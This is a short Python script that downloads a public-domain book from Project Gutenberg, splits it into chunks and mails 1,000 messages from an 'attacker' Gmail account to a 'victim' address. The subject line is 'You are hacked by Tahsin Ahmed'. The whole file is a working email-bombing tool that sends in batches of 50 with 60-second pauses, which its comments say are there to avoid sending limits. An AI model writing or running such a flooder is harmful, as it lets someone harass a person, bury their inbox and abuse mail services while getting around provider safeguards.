import requests
from math import floor
import time
import smtplib as smtp
from email.message import EmailMessage

# import the book data
book_url = 'https://www.gutenberg.org/cache/epub/729/pg729.txt'
r = requests.get(book_url)

# Remove any problematic ASCII characters (if necessary)
data = r.text.encode('ascii', 'ignore').decode('ascii')

# Split the words of the static text into a list of words
word_list = data.split(" ")

# Determine the message size of each email, and then the size of the residual email
msg_size = floor(len(word_list) / 1000)
final_msg_size = len(word_list) - (msg_size * 999)
print(f"Words per message: {msg_size}\nFinal message size: {final_msg_size}")

# Setup server authentication variables
user = 'Email of the attacker'
password = 'App password (Note: Do not use the password of your email)'
fr_address = 'Email of the attacker'
to_address = 'Email of the victim'
smtp_host = 'smtp.gmail.com'
smtp_port = 587 # I used gmail and it's SMTP port address is 587

# Setup email variables
subject = 'You are hacked by Tahsin Ahmed'
msg_text = ''
start_pos = 0
msg_count = 0

try:
    # Create and send email
    for i in range(20):
        # Open the email server connection
        server = smtp.SMTP(host=smtp_host, port=smtp_port)
        server.starttls()
        server.login(user=user, password=password)

        # Create and send the message
        for j in range(50):
            # Check to see if this is the final message, which has a slightly different range
            if msg_count == 1000:
                start_pos = (len(word_list) - final_msg_size)
                msg_text = ' '.join(word_list[start_pos:])
            else:
                start_pos = msg_count * msg_size
                msg_text = ' '.join(word_list[start_pos:start_pos + msg_size])

            # Create the email message headers and set the payload
            msg = EmailMessage()
            msg['From'] = fr_address
            msg['To'] = to_address
            msg['Subject'] = subject + str(msg_count + 1)
            msg.set_payload(msg_text)

            msg_count += 1

            # Open the email server and send the message
            server.send_message(msg)

        # Delay each batch by 60 seconds to avoid sending limits
        time.sleep(60)

        server.close()

except Exception as e:
    print(f"An error occurred: {e}")